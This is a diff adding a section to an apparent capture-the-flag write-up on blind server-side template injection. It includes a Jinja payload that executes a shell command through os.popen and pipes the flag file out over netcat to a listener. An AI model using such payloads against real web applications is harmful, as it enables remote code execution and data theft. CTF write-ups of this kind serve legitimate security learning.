@@ -67,3 +67,13 @@
 	1. In this case, we know the output won't be 'blah', but the command still executes
 2. Everything between `{% if %}` and `{% endif %}` is what would typically execute if the condition was true, but we don't have to worry about that here.
 
+### Level 3
+* Here, no matter what we input, we only see `wrong` or `correct` as an output
+	* This is a classic blind SSTI problem
+* Once again, we can use netcat to serve the file to us on our local machine
+* It looks like there isn't any WAF on this level, so we can use roughly the same payload as last time:
+
+```python3
+{{ url_for.__globals__.os.popen('cat flag | nc 127.0.0.1 4444') }}
+```
+
